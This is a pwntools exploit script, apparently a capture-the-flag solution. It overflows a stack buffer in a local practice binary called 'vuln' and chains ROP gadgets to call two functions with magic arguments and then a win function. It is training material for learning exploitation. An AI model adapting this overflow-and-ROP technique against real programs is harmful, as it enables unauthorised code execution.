#!/usr/bin/python3

from pwn import *

elf = ELF('./vuln')
io = process('./vuln')

func1_addr = elf.sym.func1
func2_addr = elf.sym.func2
win_addr = elf.sym.win

arg1 = 0xdeadbeef
arg2 = 0xcafebabe
magicman = b"magicman\x00"

pop_rdi = 0x0000000000400833
ret = 0x0000000000400559

payload = b"A" * 72

payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(arg1)
payload += p64(func1_addr)

payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(arg2)
payload += p64(func2_addr)

payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(next(elf.search(magicman)))
payload += p64(win_addr)

io.sendline(payload)
io.interactive()
